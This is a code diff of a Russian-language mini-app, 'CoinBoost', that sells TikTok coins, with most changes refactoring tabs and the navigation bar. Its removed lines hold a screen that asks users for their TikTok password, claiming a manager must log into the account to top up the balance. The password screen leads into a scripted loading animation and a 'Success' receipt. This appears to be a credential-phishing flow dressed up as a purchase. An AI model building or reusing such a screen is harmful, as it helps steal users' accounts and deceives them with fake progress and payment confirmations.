+                    <button onclick="logout()" class="w-full mt-6 bg-red-500/10 text-red-500 py-3.5 rounded-xl font-semibold text-lg flex items-center justify-center active:scale-95 transition-transform">
+                        <i data-lucide="log-out" class="w-5 h-5 mr-2"></i> Выйти из аккаунта
+                    </button>
                 </div>
 
-                <!-- 5. Пароль -->
-                <div id="flow-password" class="buy-flow-screen p-4 slide-in-right content-wrapper justify-center relative">
-                    <div class="flex flex-col items-center w-full">
-                        <div class="w-16 h-16 bg-tgCard rounded-full flex items-center justify-center mb-6">
-                            <i data-lucide="lock" class="w-8 h-8 text-tgButton"></i>
-                        </div>
-                        <h2 class="text-2xl font-bold mb-2 text-center text-white">Вход в аккаунт</h2>
-                        <p class="text-tgHint text-center mb-8 px-4 text-sm">
-                            Для безопасного пополнения баланса менеджеру необходимо авторизоваться в вашем аккаунте TikTok.
-                        </p>
-                        <div class="w-full bg-tgCard rounded-xl p-4 flex items-center mb-6 border border-transparent focus-within:border-tgButton transition-colors">
-                            <input type="password" id="tiktok-password" placeholder="Пароль от TikTok" class="bg-transparent outline-none w-full text-lg text-white">
-                        </div>
-                    </div>
-                    
-                    <div class="mt-auto absolute bottom-4 left-0 w-full px-4">
-                        <button id="btn-password" onclick="startLoading()" disabled class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform disabled:opacity-50">Продолжить</button>
-                    </div>
-                </div>
-
-                <!-- 6. Загрузка -->
-                <div id="flow-loading" class="buy-flow-screen items-center justify-center p-6 space-y-12 fade-in">
-                    <div class="relative w-40 h-40 flex items-center justify-center">
-                        <svg class="w-full h-full transform -rotate-90" viewBox="0 0 100 100">
-                            <circle class="text-tgCard stroke-current" stroke-width="6" cx="50" cy="50" r="44" fill="transparent"></circle>
-                            <circle id="progress-circle" class="text-tgButton stroke-current transition-all duration-200" stroke-width="6" stroke-linecap="round" cx="50" cy="50" r="44" fill="transparent" stroke-dasharray="276" stroke-dashoffset="276"></circle>
-                        </svg>
-                        <div class="absolute flex flex-col items-center justify-center">
-                            <i data-lucide="coins" class="w-8 h-8 text-yellow-400 mb-1"></i>
-                            <span id="progress-text" class="text-2xl font-bold text-white">0%</span>
-                        </div>
-                    </div>
-                    <div class="text-center h-16">
-                        <p id="progress-status" class="text-tgHint animate-pulse">Инициализация...</p>
-                    </div>
-                </div>
-
-                <!-- 7. Успех -->
-                <div id="flow-success" class="buy-flow-screen items-center justify-center p-6 zoom-in content-wrapper relative">
-                    <div class="w-24 h-24 bg-green-500/20 rounded-full flex items-center justify-center mb-6">
-                        <i data-lucide="check-circle-2" class="w-16 h-16 text-green-500"></i>
-                    </div>
-                    <h2 class="text-3xl font-bold mb-2 text-white">Успешно!</h2>
-                    <p class="text-tgHint text-center mb-8 px-4">
-                        Баланс аккаунта <span id="success-username" class="text-white font-semibold">@user</span> пополнен на <span id="success-coins" class="text-yellow-400 font-bold">100 монет</span>.
-                    </p>
-                    
-                    <div class="w-full bg-tgCard rounded-xl p-5 mb-10 border border-gray-800">
-                        <div class="flex justify-between items-center py-2 border-b border-gray-700/50">
-                            <span class="text-gray-400">Сумма:</span>
-                            <span class="font-bold text-white flex items-center"><i data-lucide="coins" class="w-4 h-4 text-yellow-400 mr-1.5"></i><span id="receipt-coins">100</span></span>
-                        </div>
-                        <div class="flex justify-between items-center py-2 border-b border-gray-700/50">
-                            <span class="text-gray-400">Оплачено:</span>
-                            <span id="receipt-price" class="font-bold text-white">120.00 ₽</span>
-                        </div>
-                        <div class="flex justify-between items-center py-2">
-                            <span class="text-gray-400">Статус:</span>
-                            <span class="font-bold text-green-500">Выполнено</span>
-                        </div>
-                    </div>
-
-                    <div class="mt-auto absolute bottom-4 left-0 w-full px-4">
-                        <button onclick="resetFlow()" class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">Вернуться на главную</button>
-                    </div>
-                </div>
             </div>
 
-            <!-- ТАБ 2: ИСТОРИЯ -->
-            <div id="tab-history" class="tab-content p-4 fade-in">
-                <h2 class="text-xl font-bold mb-6 mt-2 text-center text-white border-b border-gray-800 pb-4">История покупок</h2>
-                <div id="history-list" class="space-y-3 pb-6">
-                    <!-- JS -->
-                </div>
-                <div id="history-empty" class="hidden flex-col items-center justify-center h-64 opacity-50">
-                    <i data-lucide="receipt" class="w-16 h-16 mb-4 text-tgHint"></i>
-                    <p class="text-white font-medium">История пуста</p>
-                </div>
-            </div>
-
-            <!-- ТАБ 3: ПРОФИЛЬ -->
-            <div id="tab-profile" class="tab-content p-4 fade-in">
-                <h2 class="text-xl font-bold mb-6 mt-2 text-center text-white border-b border-gray-800 pb-4">Мой профиль</h2>
-                
-                <div class="bg-tgCard rounded-2xl p-6 flex items-center mb-8 border border-gray-800">
-                    <div class="w-16 h-16 bg-tgButton rounded-full flex items-center justify-center text-2xl font-bold mr-4 text-white" id="profile-avatar-letter">U</div>
-                    <div>
-                        <h3 class="text-xl font-bold text-white" id="profile-username">User</h3>
-                        <p class="text-tgHint text-sm">Аккаунт CoinBoost</p>
-                    </div>
-                </div>
-
-                <h3 class="text-sm font-bold mb-4 text-tgHint uppercase tracking-wider px-2">Сохраненные TikTok</h3>
-                <div id="profile-accounts-list" class="space-y-3 pb-6">
-                    <!-- JS -->
-                </div>
-                <div id="profile-accounts-empty" class="hidden text-center text-tgHint py-4 text-sm bg-tgCard rounded-xl">Нет сохраненных аккаунтов</div>
-
-                <button onclick="logout()" class="w-full mt-6 bg-red-500/10 text-red-500 py-3.5 rounded-xl font-semibold text-lg flex items-center justify-center active:scale-95 transition-transform">
-                    <i data-lucide="log-out" class="w-5 h-5 mr-2"></i> Выйти из аккаунта
-                </button>
-            </div>
-
-            <!-- НИЖНЯЯ ПАНЕЛЬ НАВИГАЦИИ (СТРОГИЙ TG СТИЛЬ) -->
-            <div class="absolute bottom-0 left-0 w-full bg-tgBg border-t border-[#3a3a3c] flex justify-around items-center h-[60px] pb-safe z-50">
-                <button onclick="switchTab('tab-buy')" class="nav-item active flex flex-col items-center w-1/3 pt-1" id="nav-buy">
+            <!-- НИЖНЯЯ ПАНЕЛЬ НАВИГАЦИИ -->
+            <div id="bottom-navbar" class="absolute bottom-0 left-0 w-full bg-tgBg border-t border-[#3a3a3c] flex justify-around items-center h-[60px] pb-safe z-50 transition-opacity duration-300">
+                <button onclick="switchTab('tab-buy')" class="nav-item active flex flex-col items-center w-1/3 pt-1 text-tgButton" id="nav-buy">
                     <i data-lucide="shopping-bag" class="w-6 h-6 mb-0.5"></i>
                     <span class="text-[10px] font-medium">Покупка</span>
                 </button>
-                <button onclick="switchTab('tab-history')" class="nav-item inactive flex flex-col items-center w-1/3 pt-1" id="nav-history">
+                <button onclick="switchTab('tab-history')" class="nav-item inactive flex flex-col items-center w-1/3 pt-1 text-tgHint" id="nav-history">
                     <i data-lucide="history" class="w-6 h-6 mb-0.5"></i>
                     <span class="text-[10px] font-medium">История</span>
                 </button>
-                <button onclick="switchTab('tab-profile')" class="nav-item inactive flex flex-col items-center w-1/3 pt-1" id="nav-profile">
+                <button onclick="switchTab('tab-profile')" class="nav-item inactive flex flex-col items-center w-1/3 pt-1 text-tgHint" id="nav-profile">
                     <i data-lucide="user" class="w-6 h-6 mb-0.5"></i>
                     <span class="text-[10px] font-medium">Профиль</span>
                 </button>
@@ -443,23 +437,37 @@
         function initApp() {
             const currentUser = DB.getCurrentUser();
             if (currentUser) {
-                document.getElementById('auth-screens').classList.add('hidden');
-                document.getElementById('main-app').classList.remove('hidden');
-                document.getElementById('main-app').classList.add('flex');
+                document.getElementById('auth-screens').classList.remove('active');
+                document.getElementById('main-app').classList.add('active');
                 
                 updateProfileUI();
                 renderQuickAccounts();
             } else {
-                document.getElementById('auth-screens').classList.remove('hidden');
-                document.getElementById('main-app').classList.add('hidden');
-                document.getElementById('main-app').classList.remove('flex');
+                document.getElementById('auth-screens').classList.add('active');
+                document.getElementById('main-app').classList.remove('active');
                 switchAuthScreen('screen-login');
+            }
+        }
+
+        // --- УПРАВЛЕНИЕ ВИДИМОСТЬЮ НАВБАРА ---
+        function toggleNavbarVisibility(show) {
+            const nav = document.getElementById('bottom-navbar');
+            const scrollContainer = document.getElementById('main-scroll-container');
+            
+            if (show) {
+                nav.classList.remove('hidden');
+                nav.classList.add('flex');
+                scrollContainer.classList.add('pb-[70px]'); // Возвращаем отступ
+            } else {
+                nav.classList.add('hidden');
+                nav.classList.remove('flex');
+                scrollContainer.classList.remove('pb-[70px]'); // Убираем отступ, чтобы контент был на весь экран
             }
         }
 
         // --- АВТОРИЗАЦИЯ ---
         function switchAuthScreen(id) {
-            document.querySelectorAll('#auth-screens .screen').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('#auth-screens .flow-view').forEach(s => s.classList.remove('active'));
             document.getElementById(id).classList.add('active');
             document.getElementById('login-error').classList.add('hidden');
             document.getElementById('reg-error').classList.add('hidden');
@@ -503,27 +511,37 @@
             resetFlow();
         }
 
-        // --- НАВИГАЦИЯ ---
+        // --- НАВИГАЦИЯ ПО ТАБАМ И ПОТОКАМ ---
         function switchTab(tabId) {
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-view').forEach(t => t.classList.remove('active'));
             document.getElementById(tabId).classList.add('active');
 
             document.querySelectorAll('.nav-item').forEach(n => {
-                n.classList.remove('active');
-                n.classList.add('inactive');
+                n.classList.remove('text-tgButton');
+                n.classList.add('text-tgHint');
             });
             
             const activeNav = document.getElementById('nav-' + tabId.replace('tab-', ''));
-            activeNav.classList.remove('inactive');
-            activeNav.classList.add('active');
+            activeNav.classList.remove('text-tgHint');
+            activeNav.classList.add('text-tgButton');
+
+            // Принудительно показываем навбар, если перешли в другой таб
+            toggleNavbarVisibility(true);
 
             if(tabId === 'tab-history') renderHistory();
             if(tabId === 'tab-profile') updateProfileUI();
         }
 
         function switchFlow(flowId) {
-            document.querySelectorAll('.buy-flow-screen').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.flow-view').forEach(s => s.classList.remove('active'));
             document.getElementById(flowId).classList.add('active');
+
+            // Скрываем навбар, если мы не на главном экране ввода и не на успешном завершении
+            if (flowId === 'flow-tiktok-link' || flowId === 'flow-success') {
+                toggleNavbarVisibility(true);
+            } else {
+                toggleNavbarVisibility(false);
+            }
         }
 
         // --- ПОКУПКА ---
